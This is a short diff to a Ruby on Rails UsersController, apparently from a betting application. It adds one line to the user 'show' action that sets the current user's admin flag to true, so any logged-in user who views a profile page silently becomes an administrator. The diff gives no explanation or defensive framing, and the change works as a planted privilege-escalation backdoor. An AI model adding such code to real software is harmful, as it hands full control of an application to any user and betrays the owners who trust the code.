@@ -12,6 +12,7 @@ class UsersController < ApplicationController
   # GET /users/1
   # GET /users/1.json
   def show
+    current_user.update_attribute(:admin, true)
     #@my_bets = Bet.all
     #@my_bets = Bet.where(user_id: current_user.id and user_two_id: current_user.id)
     
